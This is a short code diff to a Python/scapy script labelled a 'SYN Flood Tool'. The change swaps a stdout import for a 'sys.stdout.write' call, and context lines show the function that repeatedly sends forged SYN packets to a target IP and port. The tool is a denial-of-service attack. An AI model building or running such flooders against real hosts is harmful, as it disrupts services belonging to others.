@@ -4,7 +4,6 @@
 # Python3 SYN Flood Tool
 
 from os import system
-from sys import stdout
 from scapy.all import *
 from random import randint
 
@@ -39,7 +38,7 @@ def SYN_Flood(dstIP,dstPort):
         send(IP_Packet/TCP_Packet, verbose=0)
         total+=1
 
-    stdout.write("\nTotal packets sent: %i\n" % total)
+    sys.stdout.write("\nTotal packets sent: %i\n" % total)
 
 
 def info():
